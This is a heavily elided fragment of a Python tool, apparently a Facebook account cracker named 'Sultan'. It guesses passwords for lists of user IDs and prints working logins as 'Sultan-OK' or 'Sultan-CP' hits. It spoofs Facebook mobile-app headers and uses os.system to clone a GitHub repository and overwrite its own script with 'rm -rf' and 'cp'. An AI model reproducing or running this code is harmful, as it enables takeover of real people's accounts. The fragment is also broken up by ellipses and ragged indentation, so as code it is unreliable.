...
def log_sel():
	...
	if sel == "":
		...
		try:
			...
			os.system("git clone https://github.com/Aurangzeb-Sultan/Sultan")

			os.system("rm -rf sultan.py")

			os.system("cp -f fcpro/sultan.py \\.")

			os.system("rm -rf sultan")
								...
								if "www.facebook.com" in data.json()['error_msg']:
									...
									if "access_token" in data.text and "EAAA" in data.text:
										...
										if "www.facebook.com" in data.json()['error_msg']:
											...
											print(" \033[1;33m[Sultan-CP] "+uid+" | "+pass4+"\033[0;97m")
											...
											if "access_token" in data.text and "EAAA" in data.text:
												...
												if "www.facebook.com" in data.json()['error_msg']:
													...
													print(" \033[1;33m[Sultan-CP] "+uid+" | "+pass5+"\033[0;97m")
															...
															if "access_token" in data.text and "EAAA" in data.text:
																...
																if "www.facebook.com" in data.json()['error_msg']:
																	...
																	if "access_token" in data.text and "EAAA" in data.text:
																		...
																		print(" \033[1;32m[Sultan-OK] "+uid+" | "+pass8+"\033[0;97m")
																		...
																		if "www.facebook.com" in data.json()['error_msg']:
																			...
																			print(" \033[1;33m[Sultan-CP] "+uid+" | "+pass8+"\033[0;97m")
		...
		try:
			...
			if "access_token" in data.text and "EAAA" in data.text:
				...
				if "www.facebook.com" in data.json()['error_msg']:
					...
					headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _sultanua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
